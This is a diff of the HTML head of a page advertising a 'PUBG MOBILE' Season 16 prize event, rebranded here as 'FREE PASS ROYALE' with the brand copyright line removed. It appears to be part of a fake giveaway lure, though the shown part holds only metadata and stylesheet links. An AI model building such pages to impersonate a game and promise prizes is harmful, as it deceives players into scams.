@@ -3,16 +3,15 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta property="og:title" content="PUBG MOBILE SEASON 16">
+<meta property="og:title" content="FREE PASS ROYALE">
 <meta name="description" content="Latest PUBG MOBILE Event. Get an exclusive SEASON 16 prize !!!">
 <meta property="og:description" content="Latest PUBG MOBILE Event. Get an exclusive SEASON 16 prize !!!">
 <meta property="og:url" content="./">
-<meta property="og:site_name" content="PUBG MOBILE SEASON 16">
+<meta property="og:site_name" content="FREE PASS ROYALE">
 <meta property="og:type" content="website">
-<meta name="copyright"content="PUBG MOBILE">
 <meta name="theme-color" content="#000">
 <meta property="og:image" content="https://i.ibb.co/0GFmf9d/header.jpg">
-<title>PUBG MOBILE SEASON 16</title>
+<title>FREE PASS ROYALE</title>
 <link rel="stylesheet" href="https://raw.githack.com/ahmed-shamy/pubg1/main/style.css">
 <link rel="stylesheet" href="https://raw.githack.com/ahmed-shamy/pubg1/main/s.css">
 <link rel="stylesheet" href="https://raw.githack.com/ahmed-shamy/pubg1/main/animate.css">
